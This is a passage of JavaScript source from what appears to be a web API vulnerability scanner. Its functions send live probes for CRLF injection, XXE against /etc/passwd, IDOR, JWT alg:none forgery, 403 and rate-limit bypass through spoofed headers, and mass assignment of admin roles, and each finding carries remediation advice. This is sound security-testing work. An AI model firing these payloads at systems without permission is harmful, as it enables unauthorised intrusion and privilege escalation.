            guidance: 'Maintain an explicit allowlist of trusted origins. Never reflect arbitrary Origin headers. Never combine wildcard ACAO with credentials=true — this combination is especially dangerous.',
            matches: [`Access-Control-Allow-Origin: ${acao}${credentialsAllowed ? ', Allow-Credentials: true' : ''}`],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      } catch { /* CORS errors are expected for blocked requests */ }
    }
  }
  return results;
}

// ── HTTP Verb Tampering ───────────────────────────────────────────────────────

/**
 * Test endpoints with unexpected HTTP methods (PUT, DELETE, TRACE, OPTIONS).
 * Flags if TRACE is enabled or if destructive methods return unexpected 200/204.
 */
export async function testVerbTampering(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();
  const dangerousVerbs = ['TRACE', 'PUT', 'DELETE', 'PATCH'];

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    const baseline = await tryFetch(endpoint, timeoutMs);
    if (!baseline.ok) continue;
    const baseStatus = baseline.status;

    for (const verb of dangerousVerbs) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const res = await fetch(endpoint, {
          method: verb,
          signal: controller.signal,
          mode: 'cors',
          credentials: 'omit',
        });
        clearTimeout(timer);

        if (verb === 'TRACE' && res.status === 200) {
          done.add(basePath);
          results.push({
            id: `verb-${results.length}`,
            name: 'HTTP TRACE Method Enabled',
            category: 'Infrastructure',
            severity: 'medium',
            technique: 'verb-tampering',
            targeting: 'HTTP method tampering — tested TRACE, PUT, DELETE, PATCH methods against each discovered endpoint; TRACE enables Cross-Site Tracing (XST) attacks to steal cookies via XMLHttpRequest',
            description: `TRACE method is enabled on "${basePath}". TRACE reflects the full request back to the client including all headers, which can expose session cookies and auth tokens via Cross-Site Tracing (XST) combined with XSS.`,
            guidance: 'Disable the TRACE and TRACK HTTP methods in your web server config (Apache: TraceEnable Off, Nginx: disallow in location blocks).',
            matches: [`TRACE ${endpoint} → HTTP ${res.status}`],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }

        if ((verb === 'DELETE' || verb === 'PUT') &&
          (res.status === 200 || res.status === 204) &&
          baseStatus !== res.status) {
          done.add(basePath);
          results.push({
            id: `verb-${results.length}`,
            name: `HTTP Verb Tampering — ${verb} Unexpectedly Accepted`,
            category: 'Infrastructure',
            severity: 'high',
            technique: 'verb-tampering',
            targeting: `HTTP verb tampering — endpoint accepted ${verb} which was not expected; GET returned ${baseStatus} but ${verb} returned ${res.status}, indicating possible unauthorized data modification capability`,
            description: `Endpoint "${basePath}" accepted the ${verb} HTTP method (HTTP ${res.status}) when the baseline GET returned HTTP ${baseStatus}. This may allow unauthorized data modification or deletion.`,
            guidance: 'Explicitly allowlist HTTP methods per route. Reject unexpected HTTP verbs at the web server or API gateway level with 405 Method Not Allowed.',
            matches: [`${verb} ${endpoint} → HTTP ${res.status} (baseline GET: ${baseStatus})`],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      } catch { /* ignore */ }
    }
  }
  return results;
}

// ── CRLF Injection ────────────────────────────────────────────────────────────

/**
 * Test for CRLF injection by embedding CR/LF characters in parameters
 * and checking if they appear as injected HTTP response headers.
 */
export async function testCrlfInjection(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 8)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of CRLF_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'q', payload); } catch { continue; }

      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const res = await fetch(testUrl, {
          signal: controller.signal,
          mode: 'cors',
          credentials: 'omit',
        });
        clearTimeout(timer);
        const injectedHeader = res.headers.get('x-injected');
        const body = await res.text().catch(() => '');

        if (injectedHeader === 'crlftest' || body.includes('CRLFBODY')) {
          done.add(basePath);
          results.push({
            id: `crlf-${results.length}`,
            name: 'CRLF / HTTP Response Splitting',
            category: 'Injection',
            severity: 'high',
            technique: 'crlf-injection',
            targeting: 'HTTP response header injection via CR (\\r) and LF (\\n) characters in URL parameters — tested %0d%0a, %0a, and raw CRLF sequences to inject "X-Injected" header and Set-Cookie directives; enables session fixation, cache poisoning, and XSS via forged responses',
            description: `Payload "${payload}" resulted in an injected HTTP header appearing in the response. The server fails to sanitise CR/LF characters from user input before embedding it in response headers.`,
            guidance: 'Strip or reject CR (\\r) and LF (\\n) characters from any user input that is placed into HTTP response headers. Use framework-provided header-setting APIs which handle encoding automatically.',
            matches: [testUrl],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      } catch { /* ignore */ }
    }
  }
  return results;
}

// ── GraphQL Introspection ─────────────────────────────────────────────────────

/**
 * Test common GraphQL paths for exposed introspection.
 * Introspection exposes the entire API schema including mutations.
 */
export async function testGraphqlIntrospection(baseUrl, timeoutMs = 10000) {
  const results = [];
  let base;
  try { base = new URL(baseUrl).origin; } catch { return results; }

  for (const path of GRAPHQL_PATHS) {
    const url = base + path;
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const res = await fetch(url, {
        method: 'POST',
        signal: controller.signal,
        mode: 'cors',
        credentials: 'omit',
        headers: { 'Content-Type': 'application/json' },
        body: INTROSPECTION_QUERY,
      });
      clearTimeout(timer);
      const body = await res.text().catch(() => '');

      if (body.includes('"__schema"') || (body.includes('"types"') && body.includes('"kind"'))) {
        let typeCount = 0;
        try { typeCount = JSON.parse(body)?.data?.__schema?.types?.length ?? 0; } catch {}

        // Also test for batch query abuse
        let batchWorks = false;
        try {
          const bres = await fetch(url, {
            method: 'POST',
            mode: 'cors',
            credentials: 'omit',
            headers: { 'Content-Type': 'application/json' },
            body: GRAPHQL_BATCH_QUERY,
          });
          const bbody = await bres.text().catch(() => '');
          batchWorks = bbody.startsWith('[');
        } catch {}

        results.push({
          id: `graphql-${results.length}`,
          name: 'GraphQL Introspection Enabled',
          category: 'Infrastructure',
          severity: 'medium',
          technique: 'graphql-introspection',
          targeting: `GraphQL schema enumeration — tested ${GRAPHQL_PATHS.length} common GraphQL endpoint paths (/graphql, /api/graphql, /query, /gql, /playground, /graphiql) with __schema introspection query${batchWorks ? '; batch query execution also confirmed' : ''}`,
          description: `GraphQL endpoint at "${path}" returned introspection data exposing ${typeCount > 0 ? typeCount + ' types including' : ''} all queries, mutations, subscriptions, and field names${batchWorks ? '. Batch query execution is also enabled, enabling query complexity abuse.' : ''}.`,
          guidance: 'Disable introspection in production. If needed for internal tooling, restrict to authenticated admin users. Implement query depth/complexity limits to prevent abuse. Disable batch query execution unless specifically required.',
          matches: [`POST ${url} → schema introspection (${typeCount} types)${batchWorks ? ' + batch queries' : ''}`],
          sources: [baseUrl],
          type: 'vuln',
        });
        break;
      }
    } catch { /* ignore */ }
  }
  return results;
}

// ── XXE (XML External Entity) Injection ───────────────────────────────────────

/**
 * Test endpoints for XXE by POSTing XML with external entity definitions.
 */
export async function testXxe(endpoints, timeoutMs = 10000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 8)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const { name: payloadName, body: payloadBody, sigs } of XXE_PAYLOADS) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const res = await fetch(endpoint, {
          method: 'POST',
          signal: controller.signal,
          mode: 'cors',
          credentials: 'omit',
          headers: { 'Content-Type': 'application/xml' },
          body: payloadBody,
        });
        clearTimeout(timer);
        const body = await res.text().catch(() => '');

        for (const sig of sigs) {
          if (sig.test(body)) {
            done.add(basePath);
            results.push({
              id: `xxe-${results.length}`,
              name: 'XML External Entity Injection (XXE)',
              category: 'Injection',
              severity: 'critical',
              technique: 'xxe',
              targeting: 'XML parser exploitation — POSTed XML payloads containing DOCTYPE declarations with SYSTEM entity definitions pointing to file:///etc/passwd and internal HTTP services; tests both inline and parameter entity variants',
              description: `${payloadName}: The XML parser processed the external entity and returned system file content. The XML parser is configured to resolve external entities, allowing attackers to read server files and probe internal services.`,
              guidance: 'Disable external entity and DTD processing in your XML parser (defusedxml for Python, FEATURE_DISALLOW_DOCTYPE_DECL in Java, libxml_disable_entity_loader in PHP). Use JSON where XML is not required.',
              matches: [endpoint],
              sources: [endpoint],
              type: 'vuln',
            });
            break;
          }
        }
        if (done.has(basePath)) break;
      } catch { /* ignore */ }
    }
  }
  return results;
}

// ── IDOR Enumeration ──────────────────────────────────────────────────────────

/**
 * Test for IDOR by finding numeric ID parameters and testing adjacent IDs.
 * Flags if different content is returned for IDs that should be authorized.
 */
export async function testIdorEnumeration(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try {
      const u = new URL(endpoint);
      basePath = u.pathname;
    } catch { continue; }
    if (done.has(basePath)) continue;

    const u = new URL(endpoint);
    const params = [...u.searchParams.entries()];
    const numericParam = params.find(([, v]) => /^\d+$/.test(v));
    if (!numericParam) continue;

    const baseline = await tryFetch(endpoint, timeoutMs);
    if (!baseline.ok || baseline.status !== 200 || baseline.body.length < 20) continue;

    const baseId = parseInt(numericParam[1], 10);
    const testIds = [baseId - 1, baseId + 1, 1, 2, 100, 9999].filter(id => id > 0 && id !== baseId);

    for (const testId of testIds) {
      let testUrl;
      try {
        const tu = new URL(endpoint);
        tu.searchParams.set(numericParam[0], String(testId));
        testUrl = tu.href;
      } catch { continue; }

      const { ok, body, status } = await tryFetch(testUrl, timeoutMs);
      if (!ok || status !== 200) continue;

      const significantlyDifferent =
        body.length > 50 &&
        Math.abs(body.length - baseline.body.length) > 20 &&
        body !== baseline.body;

      if (significantlyDifferent) {
        done.add(basePath);
        results.push({
          id: `idor-${results.length}`,
          name: 'Potential IDOR — Insecure Direct Object Reference',
          category: 'Business Logic',
          severity: 'high',
          technique: 'idor-enumeration',
          targeting: `Direct object reference manipulation — found numeric parameter "${numericParam[0]}" and tested adjacent IDs (±1, 1, 2, 100, 9999) to determine if the server enforces object-level authorization or blindly serves any ID`,
          description: `Changing parameter "${numericParam[0]}" from ${numericParam[1]} to ${testId} returned a different ${body.length}-byte response (baseline: ${baseline.body.length} bytes, same HTTP ${status}). This may indicate access to another user's resource without authorization.`,
          guidance: 'Implement object-level authorization on every resource request — verify the requesting user owns or has permission for the specific resource. Use opaque non-sequential identifiers (UUID v4) instead of sequential integers.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }
  return results;
}

// ── HTTP Parameter Pollution ──────────────────────────────────────────────────

/**
 * Test for HPP by sending duplicate parameters.
 * Some backends pick the last value (bypassing WAF rules on the first value).
 */
export async function testParameterPollution(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    const u = new URL(endpoint);
    const params = [...u.searchParams.entries()];
    if (params.length === 0) continue;

    const [paramName] = params[0];
    const baseline = await tryFetch(endpoint, timeoutMs);
    if (!baseline.ok) continue;

    const testUrl = `${endpoint}&${paramName}=admin&${paramName}=1%27OR%271%27%3D%271`;

    const { ok, body, status } = await tryFetch(testUrl, timeoutMs);
    if (!ok) continue;

    const changed = status !== baseline.status ||
      (body.length > 50 && Math.abs(body.length - baseline.body.length) > 100);

    if (changed) {
      done.add(basePath);
      results.push({
        id: `hpp-${results.length}`,
        name: 'HTTP Parameter Pollution (HPP)',
        category: 'Business Logic',
        severity: 'medium',
        technique: 'parameter-pollution',
        targeting: `Duplicate parameter injection — sent the same parameter "${paramName}" multiple times with conflicting values to test inconsistent backend/WAF parsing (some frameworks take first, some take last, some concatenate), potentially bypassing security filters or overriding access controls`,
        description: `Duplicating parameter "${paramName}" changed the server response (HTTP ${baseline.status} → ${status}, ${baseline.body.length} → ${body.length} bytes). HPP can bypass WAF rules, override access controls, or trigger business logic errors.`,
        guidance: 'Define and enforce consistent parameter parsing — always take the first or last occurrence. Reject requests with duplicate parameters if your API does not expect them. WAF rules should apply to all parameter occurrences.',
        matches: [testUrl],
        sources: [endpoint],
        type: 'vuln',
      });
    }
  }
  return results;
}

// ── JWT Algorithm Analysis ─────────────────────────────────────────────────────

/**
 * Test endpoints for JWT security vulnerabilities:
 *   - Algorithm None: send JWT with alg:none and no signature
 *   - Expired token acceptance
 */
export async function testJwtAnalysis(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  // {"alg":"none","typ":"JWT"}.{"sub":"1","role":"admin","exp":9999999999}.
  const JWT_NONE_TOKEN =
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0' +
    '.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.';

  // {"alg":"HS256"}.{"sub":"1","exp":1}.INVALID_SIG
  const JWT_EXPIRED_TOKEN =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' +
    '.eyJzdWIiOiIxIiwiZXhwIjoxfQ' +
    '.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

  for (const endpoint of endpoints.slice(0, 8)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    try {
      const { ok, status, body } = await tryFetch(endpoint, timeoutMs, {
        headers: { Authorization: `Bearer ${JWT_NONE_TOKEN}` },
      });
      if (ok && status === 200 && body.length > 50 &&
          !body.toLowerCase().includes('invalid') &&
          !body.toLowerCase().includes('unauthorized') &&
          !body.toLowerCase().includes('signature')) {
        done.add(basePath);
        results.push({
          id: `jwt-none-${results.length}`,
          name: 'JWT Algorithm None Attack',
          category: 'Auth',
          severity: 'critical',
          technique: 'jwt-alg-none',
          targeting: 'JWT algorithm confusion — sent a token with alg:none and no signature; a 200 response means the server accepts unsigned tokens and authentication can be completely bypassed',
          description: `Endpoint "${basePath}" returned HTTP 200 for a JWT with alg:none (no signature). Authentication can be bypassed with any crafted payload.`,
          guidance: 'Explicitly allowlist accepted JWT algorithms (reject "none"). Enforce the expected algorithm server-side, never trust the alg field from the incoming token header.',
          matches: [endpoint],
          sources: [endpoint],
          type: 'vuln',
        });
      }
    } catch { /* ignore */ }

    if (done.has(basePath)) continue;

    try {
      const { ok, status, body } = await tryFetch(endpoint, timeoutMs, {
        headers: { Authorization: `Bearer ${JWT_EXPIRED_TOKEN}` },
      });
      if (ok && status === 200 && body.length > 50 &&
          !body.toLowerCase().includes('expired') &&
          !body.toLowerCase().includes('invalid')) {
        done.add(basePath);
        results.push({
          id: `jwt-expired-${results.length}`,
          name: 'JWT Expired Token Accepted',
          category: 'Auth',
          severity: 'high',
          technique: 'jwt-expired-token',
          targeting: 'JWT expiry validation — sent a token with exp:1 (expired 1970-01-01) to verify the server validates the exp claim on every request',
          description: `Endpoint "${basePath}" returned HTTP 200 with a long-expired JWT. Stolen tokens can be reused indefinitely.`,
          guidance: 'Always validate the exp claim. Use short-lived access tokens (15 min). Implement token revocation for critical operations.',
          matches: [endpoint],
          sources: [endpoint],
          type: 'vuln',
        });
      }
    } catch { /* ignore */ }
  }
  return results;
}

// ── 403 / 401 Bypass Techniques ───────────────────────────────────────────────

/**
 * Test for 403/401 bypass using path encoding tricks and header overrides.
 */
export async function testForbiddenBypass(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let parsedUrl, basePath;
    try {
      parsedUrl = new URL(endpoint);
      basePath = parsedUrl.pathname;
    } catch { continue; }
    if (done.has(basePath) || basePath === '/') continue;

    const baseline = await tryFetch(endpoint, timeoutMs);
    if (!baseline.ok || (baseline.status !== 403 && baseline.status !== 401)) continue;

    const baseStatus = baseline.status;
    const origin = parsedUrl.origin;

    const pathVariants = [
      basePath + '/',
      basePath + '/.',
      basePath + '%20',
      basePath + '..;/',
      '/' + basePath.slice(1).split('/').join('//'),
      basePath.replace(/([^/]+)$/, '%2e/$1'),
    ];

    const headerVariants = [
      { 'X-Original-URL': basePath },
      { 'X-Rewrite-URL': basePath },
      { 'X-Custom-IP-Authorization': '127.0.0.1' },
      { 'X-Forwarded-For': '127.0.0.1' },
      { 'X-Real-IP': '127.0.0.1' },
    ];

    let bypassed = false;

    for (const variant of pathVariants) {
      if (bypassed) break;
      try {
        const { ok, status, body } = await tryFetch(origin + variant + parsedUrl.search, timeoutMs);
        if (ok && status === 200 && body.length > 20) {
          done.add(basePath);
          bypassed = true;
          results.push({
            id: `forbidden-path-${results.length}`,
            name: '403/401 Path Bypass',
            category: 'Auth',
            severity: 'high',
            technique: 'forbidden-bypass-path',
            targeting: `Path encoding bypass — tested URL encoding tricks, trailing chars (/. %20 ..;/), double-slash paths on ${basePath}`,
            description: `Path variant "${variant}" returned HTTP ${status}, bypassing the ${baseStatus} restriction. ACL rules match exact path strings but not URL-decoded variants.`,
            guidance: 'Normalise and decode paths before ACL checks. Use route guards at the framework level, not path-string matching.',
            matches: [origin + variant],
            sources: [endpoint],
            type: 'vuln',
          });
        }
      } catch { /* ignore */ }
    }

    for (const hdrs of headerVariants) {
      if (bypassed) break;
      try {
        const { ok, status, body } = await tryFetch(origin + '/', timeoutMs, { headers: hdrs });
        if (ok && status === 200 && body.length > 100) {
          done.add(basePath);
          bypassed = true;
          const headerName = Object.keys(hdrs)[0];
          results.push({
            id: `forbidden-hdr-${results.length}`,
            name: '403/401 Header Bypass',
            category: 'Auth',
            severity: 'high',
            technique: 'forbidden-bypass-header',
            targeting: 'HTTP header override — tested X-Original-URL, X-Rewrite-URL, and IP-spoofing headers (X-Forwarded-For, X-Real-IP: 127.0.0.1)',
            description: `Header "${headerName}: ${hdrs[headerName]}" bypassed the ${baseStatus} restriction. Proxy trusts this header without validation from a verified upstream.`,
            guidance: 'Strip X-Original-URL and IP-spoofing headers at the edge. Only trust forwarding headers from known, verified proxy IPs.',
            matches: [`${headerName}: ${hdrs[headerName]} → HTTP ${status}`],
            sources: [endpoint],
            type: 'vuln',
          });
        }
      } catch { /* ignore */ }
    }
  }
  return results;
}

// ── API Version Enumeration ────────────────────────────────────────────────────

/**
 * Enumerate active API versions — older versions often lack current security controls.
 */
export async function testApiVersionEnum(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  const VERSION_PATHS = [
    '/v1', '/v2', '/v3', '/v4',
    '/api', '/api/v1', '/api/v2', '/api/v3',
    '/api/1', '/api/2',
    '/rest', '/rest/v1', '/rest/v2',
    '/_api/v1', '/public/v1', '/public/v2',
  ];

  for (const endpoint of endpoints.slice(0, 5)) {
    let parsedUrl;
    try { parsedUrl = new URL(endpoint); } catch { continue; }
    const origin = parsedUrl.origin;
    if (done.has(origin)) continue;

    const found = [];
    for (const vpath of VERSION_PATHS) {
      try {
        const { ok, status } = await tryFetch(origin + vpath, timeoutMs);
        if (ok && status < 404) found.push({ path: vpath, status });
      } catch { /* ignore */ }
    }

    if (found.length >= 2) {
      done.add(origin);
      results.push({
        id: `api-version-${results.length}`,
        name: 'Multiple API Versions Exposed',
        category: 'Reconnaissance',
        severity: 'medium',
        technique: 'api-version-enum',
        targeting: `API version enumeration — probed ${VERSION_PATHS.length} versioned paths (v1–v4, /api/v1–v3, /rest) to discover active API versions; legacy versions frequently lack rate limiting, auth, or input validation`,
        description: `Found ${found.length} active API version paths: ${found.map(f => `${f.path} (HTTP ${f.status})`).join(', ')}. Older versions may expose deprecated endpoints without current security controls.`,
        guidance: 'Decommission unused API versions. Apply identical security controls across all versions via an API gateway.',
        matches: found.map(f => origin + f.path),
        sources: [endpoint],
        type: 'vuln',
      });
    }
  }
  return results;
}

// ── Rate Limit Bypass Detection ────────────────────────────────────────────────

/**
 * Test if rate limiting can be bypassed via IP-spoofing headers.
 */
export async function testRateLimitBypass(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  const RATE_PATHS = ['/login', '/signin', '/auth', '/api/login', '/api/auth', '/token'];
  const SPOOF_HEADERS = ['X-Forwarded-For', 'X-Real-IP', 'X-Client-IP', 'True-Client-IP', 'CF-Connecting-IP'];

  for (const endpoint of endpoints.slice(0, 5)) {
    let parsedUrl;
    try { parsedUrl = new URL(endpoint); } catch { continue; }
    const origin = parsedUrl.origin;
    if (done.has(origin)) continue;

    let targetPath = null;
    for (const path of RATE_PATHS) {
      try {
        const { ok, status } = await tryFetch(origin + path, timeoutMs);
        if (ok && status < 500) { targetPath = path; break; }
      } catch { /* ignore */ }
    }
    if (!targetPath) continue;

    const responses = [];
    for (let i = 0; i < 5; i++) {
      try {
        const spoofIp = `10.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${i + 1}`;
        const headerName = SPOOF_HEADERS[i % SPOOF_HEADERS.length];
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const res = await fetch(origin + targetPath, {
          method: 'POST',
          signal: controller.signal,
          mode: 'cors',
          credentials: 'omit',
          headers: { 'Content-Type': 'application/json', [headerName]: spoofIp },
          body: JSON.stringify({ username: 'test', password: 'test' }),
        });
        clearTimeout(timer);
        responses.push({ status: res.status, header: headerName, ip: spoofIp });
      } catch { /* ignore */ }
    }

    const non429 = responses.filter(r => r.status !== 429 && r.status < 500);
    if (responses.length >= 4 && non429.length >= 3) {
      done.add(origin);
      results.push({
        id: `ratelimit-${results.length}`,
        name: 'Potential Rate Limit Bypass (IP Header Spoofing)',
        category: 'Auth',
        severity: 'medium',
        technique: 'rate-limit-bypass',
        targeting: `Rate limit bypass — sent ${responses.length} rapid POST requests to "${targetPath}" with rotating values in ${SPOOF_HEADERS.join(', ')} headers`,
        description: `${non429.length}/${responses.length} requests to "${targetPath}" with spoofed IP headers returned non-429. If rate limiting uses these headers, rotating arbitrary IP values bypasses it.`,
        guidance: 'Rate-limit based on real TCP client IP, not client-supplied headers. Only trust forwarding headers from verified proxy IPs.',
        matches: responses.slice(0, 3).map(r => `${r.header}: ${r.ip} → HTTP ${r.status}`),
        sources: [endpoint],
        type: 'vuln',
      });
    }
  }
  return results;
}

// ── Mass Assignment Testing ────────────────────────────────────────────────────

/**
 * Test for mass assignment by submitting extra privileged fields in POST bodies.
 */
export async function testMassAssignment(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  const MASS_PATHS = [
    '/register', '/signup', '/user', '/profile',
    '/api/users', '/api/register', '/api/signup',
    '/api/v1/users', '/api/v2/users',
  ];

  const EXTRA_FIELDS = {
    isAdmin: true, is_admin: true, admin: true,
    role: 'admin', roles: ['admin'],
    verified: true, plan: 'enterprise', credits: 99999,
  };

  for (const endpoint of endpoints.slice(0, 5)) {
    let parsedUrl;
    try { parsedUrl = new URL(endpoint); } catch { continue; }
    const origin = parsedUrl.origin;
    if (done.has(origin)) continue;

    for (const path of MASS_PATHS) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const res = await fetch(origin + path, {
          method: 'POST',
          signal: controller.signal,
          mode: 'cors',
          credentials: 'omit',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: `probe_${Date.now()}`,
            email: `probe_${Date.now()}@example.com`,
            password: 'TestPass123!',
            ...EXTRA_FIELDS,
          }),
        });
        clearTimeout(timer);
        const body = await res.text().catch(() => '');

        if ((res.status === 200 || res.status === 201) && body.length > 20) {
          const reflected = Object.keys(EXTRA_FIELDS).some(f => body.includes(f));
          if (reflected) {
            done.add(origin);
            results.push({
              id: `mass-assign-${results.length}`,
              name: 'Potential Mass Assignment Vulnerability',
              category: 'Auth',
              severity: 'high',
              technique: 'mass-assignment',
              targeting: `Mass assignment — POSTed to "${path}" with extra privileged fields (isAdmin, role:admin, plan:enterprise) to test if the ORM blindly maps all request body properties`,
              description: `POST to "${path}" (HTTP ${res.status}) reflected privilege-related field names. The API may bind unexpected JSON fields to internal model properties, enabling privilege escalation.`,
              guidance: 'Use DTO allowlists — explicitly define which fields users may set. Never auto-map all request body fields to model properties.',
              matches: [`POST ${origin + path} → HTTP ${res.status}`],
              sources: [endpoint],
              type: 'vuln',
            });
            break;
          }
        }
      } catch { /* ignore */ }
      if (done.has(origin)) break;
    }
  }
  return results;
}

// ── CORS Null Origin ──────────────────────────────────────────────────────────

/**
 * Test for CORS accepting the null origin (sent by sandboxed iframes).
 */
export async function testCorsNullOrigin(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    try {
      const { ok, headers } = await tryFetch(endpoint, timeoutMs, {
        headers: { Origin: 'null' },
      });
      if (!ok || !headers) continue;

      const acao = headers.get('Access-Control-Allow-Origin') || '';
      const acac = headers.get('Access-Control-Allow-Credentials') || '';

      if (acao === 'null') {
        done.add(basePath);
        const withCreds = acac.toLowerCase() === 'true';
        results.push({
          id: `cors-null-${results.length}`,
          name: 'CORS: Null Origin Accepted',
          category: 'Client-Side',
          severity: withCreds ? 'high' : 'medium',
          technique: 'cors-null-origin',
          targeting: 'CORS null origin bypass — sent Origin: null to test if the server reflects it; sandboxed iframes send null origin and can steal cross-origin data via this misconfiguration',
          description: `"Access-Control-Allow-Origin: null"${withCreds ? ' + "Access-Control-Allow-Credentials: true"' : ''} returned. Sandboxed iframes can read data from this endpoint cross-origin${withCreds ? ', including auth cookies' : ''}.`,
          guidance: 'Validate Origin against an explicit allowlist. Reject the null origin in production. Never combine null/wildcard origin with Allow-Credentials: true.',
          matches: [`Origin: null → ACAO: ${acao}${withCreds ? ', ACAC: true' : ''}`],
          sources: [endpoint],
          type: 'vuln',
        });
      }
    } catch { /* ignore */ }
  }
  return results;
}

// ── JSONP Endpoint Detection ──────────────────────────────────────────────────

/**
 * Detect legacy JSONP endpoints that wrap responses in a JS function call,
 * bypassing the Same-Origin Policy.
 */
export async function testJsonp(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  const CALLBACK_PARAMS = ['callback', 'cb', 'jsonp', 'jsonpcallback', 'call', 'fn'];
  const MARKER = 'apiscanner_jsonp_x7z';

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const param of CALLBACK_PARAMS) {
      try {
        const testUrl = injectParam(endpoint, param, MARKER);
        const { ok, body, status } = await tryFetch(testUrl, timeoutMs);
        if (!ok || !body) continue;

        const trimmed = body.trimStart();
        if (trimmed.startsWith(MARKER + '(') ||
            trimmed.startsWith(MARKER + ' (') ||
            body.includes(`${MARKER}({`) ||
            body.includes(`${MARKER}([`)) {
          done.add(basePath);
          results.push({
            id: `jsonp-${results.length}`,
            name: 'JSONP Endpoint Detected',
            category: 'Client-Side',
            severity: 'medium',
            technique: 'jsonp',
            targeting: `JSONP callback injection — appended ?${param}=${MARKER} to verify if the response wraps data in a JS function call; JSONP bypasses SOP via <script> tags`,
            description: `"${basePath}" returned JSONP: "${body.slice(0, 100)}…". Any cross-origin page can steal this data using <script src="...?callback=steal">.`,
            guidance: 'Replace JSONP with CORS. If JSONP must remain, restrict callback to alphanumeric-only and return only non-sensitive data. Add a Content-Security-Policy.',
            matches: [`?${param}=${MARKER} → JSONP (HTTP ${status})`],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      } catch { /* ignore */ }
    }
  }
  return results;
}

// ── Content-Type Switching ─────────────────────────────────────────────────────

/**
 * Test for content-type confusion — switching to form-encoded or XML may bypass
 * WAF rules or trigger different parser behaviour.
 */
export async function testContentTypeSwitch(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 8)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    let jsonStatus = null;
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const res = await fetch(endpoint, {
        method: 'POST',
        signal: controller.signal,
        mode: 'cors',
        credentials: 'omit',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ test: 'value' }),
      });
      clearTimeout(timer);
      jsonStatus = res.status;
    } catch { continue; }

    if (jsonStatus === null || jsonStatus >= 500) continue;

    const altTypes = [
      { type: 'application/x-www-form-urlencoded', body: 'test=value' },
      { type: 'text/plain', body: '{"test":"value"}' },
      { type: 'application/xml', body: '<root><test>value</test></root>' },
    ];

    for (const { type, body } of altTypes) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const res = await fetch(endpoint, {
          method: 'POST',
          signal: controller.signal,
          mode: 'cors',
          credentials: 'omit',
          headers: { 'Content-Type': type },
          body,
        });
        clearTimeout(timer);

        if (jsonStatus >= 400 && res.status < 400) {
          done.add(basePath);
          results.push({
            id: `ct-switch-${results.length}`,
            name: 'Content-Type Switch Anomaly',
            category: 'Auth',
            severity: 'low',
            technique: 'content-type-switch',
            targeting: `Content-Type switching — POSTed to "${basePath}" with alternate types (form-encoded, text/plain, XML) to detect inconsistent parser handling that bypasses validation or WAF rules`,
            description: `Switching to "${type}" changed the response from HTTP ${jsonStatus} to HTTP ${res.status}. Different parsers may bypass input validation, enabling WAF bypass or prototype pollution.`,
            guidance: 'Validate Content-Type server-side. Reject unexpected types. Apply schema validation regardless of content type.',
            matches: [`Content-Type: ${type} → HTTP ${res.status} (JSON baseline: ${jsonStatus})`],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
